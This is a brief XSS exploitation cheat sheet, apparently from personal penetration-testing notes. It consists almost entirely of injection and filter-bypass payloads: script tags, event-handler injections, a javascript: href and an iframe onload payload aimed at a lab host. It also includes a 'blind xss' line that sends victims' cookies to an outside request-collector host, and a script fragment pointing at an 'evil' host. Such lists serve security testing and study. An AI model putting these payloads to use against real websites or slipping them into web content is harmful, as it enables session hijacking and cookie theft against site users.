---
title: Cross-Site Scripting
description: Attacker injecting malicious code into a website and it's getting executed in the browser of other users.
sidebar: {"order": 1}
---
## Exploit
### Testing for XSS
Test for html injection first
```html
<h1>XSS</h1>
```

Fuzz to see what symbols can be used using [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### Basic
```js
<script>alert(0)</script>
```

### Bypasses

Image on error:
```js
<img src=x onerror=print()>
```

href attribute:
```js
href="javascript:alert(1)"
```

fragments:
```js
<script src=//evil/?c=
```

trailing slashes:
```js
`</script/x>`
```

nested tags:
```js
<<h2>>
```

case sensitive:
```js
<IFRAME>
```

non-existent tag:
```js
<notreal onpointerrawupdate=alert(0)>
```
autofocus:
```js
x" onfocus=alert(1) autofocus tabindex=1>
```

onmouseover:
```js
"onmouseover="alert(1)
```

blind xss:
```js
><script>document.location='https://enp0qp6rqroqc.x.pipedream.net?c='+document.cookie</script>
```

iframe:
```js
<iframe src="https://0a9800c3034ba0e181fafc8700b00051.web-security-academy.net/#" onload=this.src+="%3Cimg%20src=x%20onerror=print()%3E"></iframe>
```

## Resources
- [requestBin](https://public.requestbin.com/)
- [Ghetto XSS Cheatsheet](https://d3adend.org/xss/ghettoBypass)
